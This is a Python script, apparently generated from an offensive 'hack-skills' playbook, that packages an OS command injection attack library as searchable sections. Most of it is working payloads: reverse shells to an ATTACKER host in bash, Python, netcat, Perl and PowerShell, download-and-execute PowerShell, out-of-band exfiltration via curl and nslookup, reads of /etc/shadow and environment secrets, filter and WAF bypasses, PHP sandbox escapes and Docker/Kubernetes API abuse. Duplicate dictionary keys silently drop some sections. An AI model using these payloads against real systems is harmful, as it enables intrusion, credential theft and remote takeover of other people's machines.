#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/cmdi-command-injection

Skill: SKILL: OS Command Injection — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-cmdi-command-injection.py --help
      python hack-skills-cmdi-command-injection.py --list
      python hack-skills-cmdi-command-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/cmdi-command-injection'
TITLE = 'SKILL: OS Command Injection — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: cmdi-command-injection", "description: >-", "Command injection playbook. Use when user input may reach shell commands, process execution, converters, import pipelines, or blind out-of-band command sinks."],
    'skill-os-command-injection-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, you can first load:", "- [upload insecure files](../upload-insecure-files/SKILL.md) when the shell sink is part of a broader upload, import, or conversion workflow"],
    'first-pass-payload-families': ["```text", "cat$IFS/etc/passwd", "{cat,/etc/passwd}", "%0aid"],
    '1-shell-metacharacters-injection-operators': ["These characters break out of the command context and inject new commands:"],
    '2-common-vulnerable-code-patterns': [],
    'php': ["```php", "$dir = $_GET['dir'];", "$out = shell_exec(\"du -h /var/www/html/\" . $dir);", "// Inject: dir=../ ; cat /etc/passwd", "// Inject: dir=../ $(cat /etc/passwd)", "exec(\"ping -c 1 \" . $ip);          // $ip = \"127.0.0.1 && cat /etc/passwd\"", "system(\"convert \" . $file);        // ImageMagick RCE", "passthru(\"nslookup \" . $host);     // $host = \"x.com; id\""],
    'python': ["```python", "import os", "os.system(\"curl \" + url)            # url = \"x.com; id\"", "subprocess.call(\"ls \" + path, shell=True)  # shell=True is the key vulnerability", "os.popen(\"ping \" + host)"],
    'node-js': ["```javascript", "const { exec } = require('child_process');", "exec('ping ' + req.query.host, ...);  // host = \"x.com; id\""],
    'perl': ["```perl", "$dir = param(\"dir\");", "$command = \"du -h /var/www/html\" . $dir;", "system($command);", "// Inject dir field: | cat /etc/passwd"],
    'asp-classic': ["```vb", "szCMD = \"type C:\\logs\\\" & Request.Form(\"FileName\")", "Set oShell = Server.CreateObject(\"WScript.Shell\")", "oShell.Run szCMD", "// Inject FileName: foo.txt & whoami > C:\\inetpub\\wwwroot\\out.txt"],
    '3-blind-command-injection-detection': ["When response shows no command output:"],
    'time-based-detection': ["```bash"],
    'linux': ["; sleep 5", "$(sleep 5)", "`sleep 5`", "& sleep 5 &"],
    'windows': ["& timeout /T 5 /NOBREAK", "& ping -n 5 127.0.0.1", "& waitfor /T 5 signal777", "Compare response time without payload vs with payload. 5+ second delay = confirmed."],
    'oob-via-dns': ["```bash"],
    'linux': ["; nslookup BURP_COLLAB_HOST", "; host `whoami`.BURP_COLLAB_HOST", "$(nslookup $(whoami).BURP_COLLAB_HOST)"],
    'windows': ["& nslookup BURP_COLLAB_HOST", "& nslookup %USERNAME%.BURP_COLLAB_HOST"],
    'oob-via-http': ["```bash"],
    'linux': ["; curl http://BURP_COLLAB_HOST/`whoami`", "; wget http://BURP_COLLAB_HOST/$(id|base64)"],
    'windows': ["& powershell -c \"Invoke-WebRequest http://BURP_COLLAB_HOST/$(whoami)\""],
    'oob-via-out-of-band-file': ["```bash", "; id > /var/www/html/RANDOM_FILE.txt"],
    'then-access-https-target-com-random-file-txt': [],
    '4-injection-context-variations': [],
    'within-quoted-string': ["```bash", "command \"INJECT\""],
    'inject-id': [],
    'result-command-id': [],
    'within-single-quoted-string': ["```bash", "command 'INJECT'"],
    'inject-id': [],
    'result-command-id': [],
    'within-backtick-execution': ["```bash", "output=`command INJECT`"],
    'inject-x-id': [],
    'file-path-context': ["```bash", "cat /var/log/INJECT"],
    'inject-etc-passwd-path-traversal': [],
    'inject-access-log-id-command-injection': [],
    '5-payload-library': [],
    'information-gathering': ["```bash", "; id                          # current user", "; whoami                      # user name", "; uname -a                    # OS info", "; cat /etc/passwd             # user list", "; cat /etc/shadow             # password hashes (if root)", "; ls /home/                   # home directories", "; env                         # environment variables (DB creds, API keys!)", "; printenv                    # same", "; cat /proc/1/environ         # process environment", "; ifconfig                    # network interfaces", "; cat /etc/hosts              # host entries"],
    'reverse-shells-linux': ["```bash"],
    'bash': ["; bash -i >& /dev/tcp/ATTACKER/4444 0>&1", "; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"],
    'python': ["; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"],
    'netcat-with-e': ["; nc ATTACKER 4444 -e /bin/bash"],
    'netcat-without-e-openbsd': ["; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f"],
    'perl': ["; perl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"],
    'reverse-shells-windows-via-powershell': ["```powershell", "& powershell -NoP -NonI -W Hidden -Exec Bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')\"", "& powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""],
    '6-filter-bypass-techniques': [],
    'space-alternatives-when-space-is-filtered': ["```bash", "cat</etc/passwd          # < instead of space", "{cat,/etc/passwd}        # brace expansion", "cat$IFS/etc/passwd       # $IFS variable (field separator)", "X=$'\\x20'&&cat${X}/etc/passwd  # hex encoded space"],
    'slash-alternatives-when-is-filtered': ["```bash", "$'\\057'etc$'\\057'passwd  # octal representation", "cat /???/???sec???        # glob expansion"],
    'keyword-bypass-via-variable-assembly': ["```bash", "a=c;b=at;c=/etc/passwd; $a$b $c   # 'cat /etc/passwd'", "c=at;ca$c /etc/passwd              # cat"],
    'newline-injection': ["cmd%0Aid%0Awhoami          # URL-encoded newlines", "cmd$'\\n'id$'\\n'whoami      # literal newlines"],
    '7-common-injection-entry-points': [],
    '8-blind-injection-decision-tree': ["Found potential injection point?", "\u251c\u2500\u2500 Try basic: ; sleep 5", "\u2502   \u2514\u2500\u2500 Response delays? \u2192 Confirmed blind injection", "\u2502       \u251c\u2500\u2500 Extract data via timing: if/then sleep", "\u2502       \u2514\u2500\u2500 Use OOB: curl/nslookup to Collaborator", "\u251c\u2500\u2500 No delay observed?", "\u2502   \u251c\u2500\u2500 Try: | sleep 5", "\u2502   \u251c\u2500\u2500 Try: $(sleep 5)", "\u2502   \u251c\u2500\u2500 Try: ` sleep 5 `", "\u2502   \u251c\u2500\u2500 Try after URL encoding: %3B%20sleep%205", "\u2502   \u2514\u2500\u2500 Try double encoding: %253B%2520sleep%25205", "\u2514\u2500\u2500 All blocked \u2192 check WEB APPLICATION LAYER", "Filter on input? \u2192 encode differently", "Filter on specific commands? \u2192 whitespace bypass, $IFS, glob"],
    '9-advanced-waf-bypass-techniques': [],
    'wildcard-expansion': ["```bash"],
    'use-and-to-bypass-keyword-filters': ["/???/??t /???/p??s??    # /bin/cat /etc/passwd", "/???/???/????2 *.php     # /usr/bin/find2 *.php (approximate)"],
    'globbing-for-specific-files': ["cat /e?c/p?sswd", "cat /e*c/p*d"],
    'cat-alternatives-when-cat-is-filtered': ["```bash", "tac /etc/passwd          # reverse cat", "nl /etc/passwd           # numbered lines", "head /etc/passwd", "tail /etc/passwd", "more /etc/passwd", "less /etc/passwd", "sort /etc/passwd", "uniq /etc/passwd", "rev /etc/passwd | rev", "xxd /etc/passwd", "strings /etc/passwd", "od -c /etc/passwd", "base64 /etc/passwd       # then decode offline"],
    'comment-insertion-php-specific': ["```bash"],
    'insert-comments-within-function-names-to-bypass-waf': ["sys/*x*/tem('id')        # PHP ignores /* */ in some eval contexts"],
    'note-this-works-with-eval-and-similar-php-dynamic-calls': [],
    'xor-string-construction-php': ["```php"],
    'build-function-names-from-xor-of-printable-characters': ["$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');"],
    'produces-assert': ["$_('%13%19%13%14%05%0d'|'%60%60%60%60%60%60');"],
    'evaluates-assert-system': [],
    'base64-rot13-encoding': ["```php"],
    'encode-payload-decode-at-runtime': ["base64_decode('c3lzdGVt')('id');     # system('id')", "str_rot13('flfgrz')('id');           # system \u2192 flfgrz via ROT13"],
    'chr-assembly': ["```php"],
    'build-strings-character-by-character': ["chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # \"system\""],
    'dollar-sign-variable-tricks': ["```bash"],
    'ifs-internal-field-separator-as-space': ["cat$IFS/etc/passwd", "cat${IFS}/etc/passwd"],
    'unset-variables-expand-to-empty': ["c${x}at /etc/passwd      # $x is unset \u2192 \"cat\""],
    '10-php-disable-functions-bypass-paths': ["When `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` are all disabled:"],
    'path-1-ld-preload-mail-putenv': ["```php", "// 1. Upload shared object (.so) that hooks a libc function", "// 2. Set LD_PRELOAD to point to it", "putenv(\"LD_PRELOAD=/tmp/evil.so\");", "// 3. Trigger external process (mail() calls sendmail)", "mail(\"a@b.com\", \"\", \"\");", "// The .so's constructor runs with shell access"],
    'path-2-shellshock-cve-2014-6271': ["```php", "// If bash is vulnerable to Shellshock:", "putenv(\"PHP_LOL=() { :; }; /usr/bin/id > /tmp/out\");", "mail(\"a@b.com\", \"\", \"\");", "// Bash processes the function definition and runs the trailing command"],
    'path-3-apache-mod-cgi-htaccess': ["```php", "// Write .htaccess enabling CGI:", "file_put_contents('/var/www/html/.htaccess', 'Options +ExecCGI\\nAddHandler cgi-script .sh');", "// Write CGI script:", "file_put_contents('/var/www/html/cmd.sh', \"#!/bin/bash\\necho Content-type: text/html\\necho\\n$1\");", "chmod('/var/www/html/cmd.sh', 0755);", "// Access: /cmd.sh?id"],
    'path-4-php-fpm-fastcgi': ["```php", "// If PHP-FPM socket is accessible (/var/run/php-fpm.sock or port 9000):", "// Send crafted FastCGI request to execute arbitrary PHP with different php.ini", "// Tool: https://github.com/neex/phuip-fpizdam", "// Override: PHP_VALUE=auto_prepend_file=/tmp/shell.php"],
    'path-5-com-object-windows': ["```php", "// Windows only, if COM extension enabled:", "$wsh = new COM('WScript.Shell');", "$exec = $wsh->Run('cmd /c whoami > C:\\inetpub\\wwwroot\\out.txt', 0, true);"],
    'path-6-imagemagick-delegate-cve-2016-3714-imagetragick': ["```php", "// If ImageMagick processes user-uploaded images:", "// Upload SVG/MVG with embedded command:", "// Content of exploit.svg:", "push graphic-context", "viewbox 0 0 640 480", "fill 'url(https://example.com/image.jpg\"|id > /tmp/pwned\")'", "pop graphic-context", "**Also consider (summary):** iconv (CVE-2024-2961) via `php://filter/convert.iconv`; FFI (`FFI::cdef` + `libc`) when the extension is enabled."],
    '11-component-level-command-injection': [],
    'imagemagick-delegate-abuse': [],
    'mvg-format-with-shell-command-in-url': ["push graphic-context", "viewbox 0 0 640 480", "image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id > /tmp/out`'", "pop graphic-context"],
    'or-via-filename-convert-id-out-png': [],
    'ffmpeg-hls-concat-protocol': [],
    'ssrf-lfi-via-m3u8-playlist': ["concat:http://attacker.com/header.txt|file:///etc/passwd"],
    'upload-as-m3u8-ffmpeg-processes-and-may-leak-file-contents-in-output': [],
    'elasticsearch-groovy-script-pre-5-x': ["```json", "POST /_search", "\"query\": { \"match_all\": {} },", "\"script_fields\": {", "\"cmd\": {", "\"script\": \"Runtime rt = Runtime.getRuntime(); rt.exec('id')\""],
    'ping-traceroute-nslookup-diagnostic-pages': [],
    'classic-injection-point-in-network-diagnostic-features': [],
    'input-127-0-0-1-id': [],
    'input-127-0-0-1-cat-etc-passwd': [],
    'input-id-attacker-com-dns-exfil-via-backtick': [],
    'these-features-directly-call-os-commands-with-user-input': ["**Other sinks (quick reference):** PDF generators (wkhtmltopdf / WeasyPrint with user HTML); Git wrappers (`git clone` URL / hooks)."],
    '12-windows-cmd-exe-vs-powershell-injection-matrix': [],
    'cmd-exe-specific-payloads': ["```batch", "REM Command chaining", "dir & whoami", "dir && whoami", "dir || whoami", "REM Caret escape to bypass keyword filters", "w^h^o^a^m^i", "n^e^t u^s^e^r", "REM Variable expansion injection", "set CMD=whoami", "%CMD%", "REM Environment variable exfiltration via DNS", "nslookup %USERNAME%.attacker.com", "nslookup %COMPUTERNAME%.attacker.com", "REM Delayed expansion (when !var! is enabled)", "cmd /V:ON /C \"set x=whoami&!x!\""],
    'powershell-specific-payloads': ["```powershell"],
    'semicolon-separator': ["Get-Process; whoami"],
    'subexpression': ["\"$(whoami)\"", "Write-Output $(hostname)"],
    'base64-encoded-command-utf-16le': ["powershell -EncodedCommand dwBoAG8AYQBtAGkA"],
    'decodes-to-whoami': [],
    'invoke-expression-obfuscation': ["$a='who';$b='ami';iex \"$a$b\"", "& (gcm *ke-*) \"whoami\""],
    'download-and-execute': ["IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')", "IEX (iwr http://attacker/payload.ps1 -UseBasicParsing).Content"],
    'constrained-language-mode-bypass-if-available': ["powershell -Version 2 -Command \"whoami\""],
    'cross-platform-payload-differences': [],
    'detection-first-polyglot': ["```text", ";sleep${IFS}5;#&timeout /T 5 /NOBREAK&#", "Works across sh/bash/cmd contexts \u2014 one of the separators will fire."],
    '13-container-k8s-exec-injection': [],
    'kubectl-exec-injection': ["When a web application constructs `kubectl exec` commands with user input:", "```text"],
    'vulnerable-pattern': ["kubectl exec $POD_NAME -- /bin/sh -c \"echo $USER_INPUT\""],
    'injection-via-pod-name': ["POD_NAME=\"mypod -- /bin/sh -c whoami #\"", "\u2192 kubectl exec mypod -- /bin/sh -c whoami # -- /bin/sh -c \"echo ...\""],
    'injection-via-user-input-in-command': ["USER_INPUT='\"; cat /etc/passwd; echo \"'", "\u2192 kubectl exec pod -- /bin/sh -c \"echo \"\"; cat /etc/passwd; echo \"\"\""],
    'docker-exec-injection': ["```text"],
    'vulnerable-web-admin-panel': ["docker exec $CONTAINER_NAME $COMMAND"],
    'injection-via-container-name': ["CONTAINER_NAME=\"web_app -u root web_app\"", "\u2192 docker exec web_app -u root web_app $COMMAND  (runs as root)"],
    'injection-via-command-argument': ["COMMAND=\"status; cat /etc/shadow\"", "\u2192 docker exec container /bin/sh -c \"status; cat /etc/shadow\""],
    'container-runtime-api-unauthenticated': ["```text"],
    'docker-socket-exposed-2375-2376-or-var-run-docker-sock': ["POST /containers/create HTTP/1.1", "{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /host/etc/shadow\"],\"Binds\":[\"/:/host\"]}"],
    'then-start-exec': ["POST /containers/{id}/start", "POST /containers/{id}/exec {\"Cmd\":[\"cat\",\"/host/etc/shadow\"]}"],
    'kubernetes-api-6443-8443-unauthenticated': ["POST /api/v1/namespaces/default/pods/{name}/exec?command=whoami&stdout=true"],
    'sinks-to-watch-for': [],
    '14-environment-variable-injection': ["When an application allows setting or influencing environment variables, several variables have **implicit execution** semantics:"],
    'linux-unix': [],
    'windows': [],
    'attack-scenarios': ["**PHP `putenv()` + `mail()`**:", "```php", "// When putenv() is not disabled and mail() is available:", "putenv(\"LD_PRELOAD=/tmp/evil.so\");", "mail(\"a@b.com\",\"\",\"\",\"\");", "// mail() invokes sendmail \u2192 loads evil.so \u2192 constructor executes arbitrary code", "**Git hook injection via environment**:", "```bash"],
    'git-dir-git-work-tree-manipulation': ["GIT_DIR=/tmp/evil_repo/.git git status"],
    'if-hooks-exist-in-the-controlled-repo-they-execute': ["**Node.js `--require` injection**:", "```bash", "NODE_OPTIONS=\"--require=/tmp/reverse_shell.js\" node /app/server.js"],
    'reverse-shell-js-is-loaded-before-server-js': [],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()